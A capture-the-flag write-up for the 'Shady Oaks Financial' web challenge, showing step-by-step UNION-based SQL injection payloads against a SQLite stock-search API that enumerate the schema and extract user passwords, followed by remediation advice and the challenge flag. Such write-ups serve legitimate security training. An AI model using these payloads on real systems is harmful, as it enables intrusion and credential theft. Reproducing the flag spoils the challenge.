# Shady Oaks Financial — shadyoaks-005 — Search for the best stocks.

## Challenge Information

- **Platform:** Bugforge
- **Challenge:** Shady Oaks Financial
- **Category:** Web Exploitation
- **Vulnerability:** SQL Injection (SQLi)
- **Technique:** UNION-based SQL Injection
- **Database:** SQLite
- **Difficulty:** As assigned by the platform

## Objective

Investigate the stock-search functionality, identify the underlying database, enumerate its tables, and retrieve the challenge flag.

## 1. Reconnaissance

After logging into the application, I navigated to the Stocks page and inspected the stock-search functionality.

The application used the following endpoint:

```http
GET /api/stocks/search?q=<search_term>
```

I first submitted a single quote (`'`) to test how the application handled SQL syntax.

The endpoint returned HTTP 200 with an empty response. This alone did not confirm SQL injection, so I proceeded with additional tests.

## 2. Confirming SQL Injection

I submitted the following payload:

```sql
' OR 1=1 --
```

The endpoint returned all five stock records instead of an empty result.

This behavior indicated that the search input was likely being incorporated into a SQL query without proper parameterization. The injected Boolean condition altered the query's filtering logic.

## 3. Determining the Number of Columns

To identify the number of columns in the original query, I tested `ORDER BY` expressions with increasing column indices.

Example:

```sql
' ORDER BY 8 --
```

This request succeeded, whereas:

```sql
' ORDER BY 9 --
```

returned HTTP 500 with a database error.

This established that the original query returned **eight columns**.

## 4. Identifying Column Positions and Data Types

I used a UNION-based query containing eight `NULL` values:

```sql
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
```

The response contained an additional record with eight fields, confirming that a compatible UNION query could inject a row into the returned results.

I then tested a mixture of numeric and string values:

```sql
' UNION SELECT 1, 'NULL', 'NULL', 4, 5, 'NULL', 'NULL', 'NULL' --
```

The response mapped the injected values to these fields:

| Position | Response field |
|---:|---|
| 1 | `id` |
| 2 | `symbol` |
| 3 | `name` |
| 4 | `initial_price` |
| 5 | `current_price` |
| 6 | `description` |
| 7 | `trend` |
| 8 | `created_at` |

This mapping allowed subsequent UNION queries to place extracted information into fields that the API returned visibly.

## 5. Identifying the Database Engine

I tested database-version expressions from several database engines.

The SQLite-specific payload was:

```sql
' UNION SELECT 1, 'NULL', 'NULL', 4, 5, 'NULL', 'NULL', sqlite_version() --
```

The response returned:

```text
3.44.2
```

The successful execution of `sqlite_version()` confirmed that the backend used **SQLite version 3.44.2**.

## 6. Enumerating Database Tables

SQLite exposes database schema information through the `sqlite_master` table.

I used the following payload to enumerate tables:

```sql
' UNION SELECT 1, 'NULL', 'NULL', 4, 5, 'NULL', tbl_name, NULL
FROM sqlite_master
WHERE type='table' --
```

The response revealed the following tables:

- `currencies`
- `exchange_rates`
- `sqlite_sequence`
- `stock_prices`
- `stocks`
- `transactions`
- `user_stocks`
- `users`

The `users` table was particularly interesting because it could contain account information and authentication-related data.

## 7. Inspecting the Users Table Schema

To retrieve the table definition, I queried SQLite's schema metadata:

```sql
' UNION SELECT sql, 'NULL', 'NULL', 4, 5, 'NULL', 'NULL', tbl_name
FROM sqlite_master
WHERE type='table' AND name='users' --
```

The returned schema included the following fields:

- `id`
- `username`
- `email`
- `password`
- `full_name`
- `balance_eur`
- `balance_usd`
- `balance_gbp`
- `role`
- `is_portfolio_public`
- `share_token`
- `created_at`

The `username`, `password`, and `role` fields were particularly relevant to further investigation.

## 8. Extracting User Records

I constructed another UNION query to place usernames and passwords into the visible response fields:

```sql
' UNION SELECT 1, 'NULL', 'NULL', 4, 5, 'NULL',
username, password FROM users --
```

The response exposed multiple user records. One of the returned records contained the challenge flag in the password field associated with the `admin` username.

## 9. Flag

```text
bug{D1X9CnThk9BJrho2hCsVw1XlM7j15pKq}
```

## Root Cause

The stock-search endpoint appears to construct SQL using untrusted search input. The input was not safely isolated from SQL syntax, allowing an attacker to modify query logic and append a compatible `UNION SELECT`.

The endpoint also serialized injected database values into the normal API response, making database enumeration and extraction possible.

## Security Impact

The demonstrated vulnerability allowed:

- Bypassing the intended stock-search filter.
- Injecting additional rows into query results.
- Discovering database tables and their schemas.
- Reading records from the `users` table.
- Exposing usernames and password values, including a sensitive value associated with the administrator account.

Depending on the application's authentication and authorization design, this could lead to account compromise and further unauthorized access.

## Remediation

1. **Use parameterized queries:** Bind search input as a parameter instead of concatenating it into SQL.
2. **Apply least privilege:** Restrict database access to only the tables and operations needed by each feature.
3. **Protect credentials:** Store passwords using an appropriate password-hashing algorithm such as Argon2id or bcrypt, with unique salts.
4. **Validate search inputs:** Apply appropriate input validation, while recognizing that validation alone is not a substitute for parameterized queries.
5. **Handle database errors safely:** Return generic client-facing errors and log diagnostic details securely on the server.
6. **Prevent excessive data exposure:** Ensure the search endpoint returns only the fields required by the Stocks page.
7. **Add security tests:** Test the endpoint for SQL injection and verify that user-controlled values cannot change query structure.

## Key Takeaways

- A single quote is a useful initial SQL injection probe, but a lack of visible output does not rule out a vulnerability.
- `ORDER BY` can help determine a query's column count.
- `UNION SELECT` can expose additional records when column counts and data types are compatible.
- SQLite's `sqlite_master` provides useful schema metadata during authorized database testing.
- SQL injection can escalate from manipulating search results to exposing sensitive user records when database access is insufficiently restricted.

**Conclusion:** The challenge was solved by identifying an injectable stock-search endpoint, confirming an eight-column query, fingerprinting SQLite, enumerating the schema, and retrieving the flag from the `users` table.